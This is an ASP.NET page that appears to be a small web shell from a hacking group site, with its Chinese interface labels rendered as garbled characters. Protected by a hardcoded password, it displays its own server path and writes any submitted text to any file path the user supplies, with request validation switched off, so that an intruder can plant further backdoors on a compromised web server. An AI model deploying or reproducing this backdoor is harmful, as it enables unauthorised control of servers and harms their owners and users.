<%@ Page Language="C#" AutoEventWireup="true" validateRequest="false"%>
<html>
<head runat="server">
    <title>08С���ڲ�����ר��  www.huc08.com</title>
    <style type="text/css">
    .btn{
    background-color:transparent;
    color:#00FF00;
    border:1px solid #00FF00;
    font-size:12px;
    font-weight:bold;
    }
    </style>
    <script language="c#" runat="server">
    void Page_Load(object sender, EventArgs e)
    {
            this.lblthispath.Text = Server.MapPath(Request.ServerVariables["PATH_INFO"]);
    }
    void btnUpload_Click(object sender, EventArgs e)
    {
        string password = "TNTHK";
        if (password.Equals(this.txtPass.Text))
        {
            System.IO.StreamWriter sw = new System.IO.StreamWriter(this.txtPath.Text,true,System.Text.Encoding.GetEncoding("gb2312"));
            sw.Write(this.txtContext.Text);
            sw.Flush();
            sw.Close();
            Response.Write("�ϴ��ɹ���");
        }
        else
        {
            Response.Write("�������������Ҳ���ݣ�"); 
        } 
    }
    </script>
</head>
<body style="font-size:12px;font-weight:bold;color:#00FF00;font-family:Arial, Helvetica, sans-serif;background-color:#000000;">
    <form id="form1" runat="server">
    <div>
    ���ļ�·��:<asp:Label runat="server" ID="lblthispath" Text=""></asp:Label>
    <br />
    <br />
    �ϴ��Ŀ���:<asp:TextBox runat="server" ID="txtPass" Width="400px"></asp:TextBox>
    <br />
    <br />
    �ϴ���·��:<asp:TextBox runat="server" ID="txtPath" Width="400px" ></asp:TextBox>
    <br />
    <br />
    �ϴ�������:<asp:TextBox runat="server" ID="txtContext" Width="400px" Height="250px" TextMode="MultiLine"></asp:TextBox>
    <br />
    <br />
    <br />
    <asp:Button runat="server" ID="btnUpload" text="�ϴ�" CssClass="btn" OnClick="btnUpload_Click"/>
    </div>
    </form>
</body>
</html>